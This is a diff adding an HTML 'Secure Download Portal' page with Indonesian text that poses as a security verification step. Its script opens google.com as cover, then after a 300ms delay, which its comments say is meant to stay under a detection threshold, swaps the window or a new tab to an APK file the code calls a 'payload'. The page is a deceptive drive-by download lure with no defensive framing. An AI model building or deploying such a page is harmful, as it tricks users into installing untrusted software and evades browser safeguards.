@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Download Portal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+    }
+    .button {
+      background: #4285f4;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 16px;
+    }
+    .button:hover {
+      background: #3367d6;
+    }
+    .status {
+      margin-top: 12px;
+      font-size: 14px;
+      color: #d93025;
+      min-height: 1.4em;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Verifikasi Keamanan</h2>
+    <p>Klik di bawah untuk memulai verifikasi dan unduh file.</p>
+    <button class="button" onclick="startFlow()">Lanjutkan ke Google</button>
+    <div class="status" id="status"></div>
+  </div>
+
+  <script>
+    function startFlow() {
+      const statusEl = document.getElementById('status');
+
+      // Langkah 1: Buka domain tepercaya (Google)
+      const legitWin = window.open(
+        'https://google.com',
+        'trusted_session',
+        'noopener,noreferrer,width=600,height=700'
+      );
+
+      if (!legitWin) {
+        statusEl.textContent = "Popup diblokir. Izinkan popup dan coba lagi.";
+        return;
+      }
+
+      // Langkah 2: Setelah delay sangat pendek (di bawah threshold deteksi)
+      setTimeout(() => {
+        try {
+          // Ganti isi window dengan payload
+          legitWin.location.href = 'https://abhirdd.github.io/test.apk';
+        } catch (e) {
+          // Jika gagal karena cross-origin policy, buka di tab baru
+          window.open('https://abhirdd.github.io/test.apk', '_blank', 'noopener,noreferrer');
+        }
+      }, 300); // ⚡ 300ms: dalam "grace period" user gesture di beberapa browser
+    }
+  </script>
+</body>
+</html>
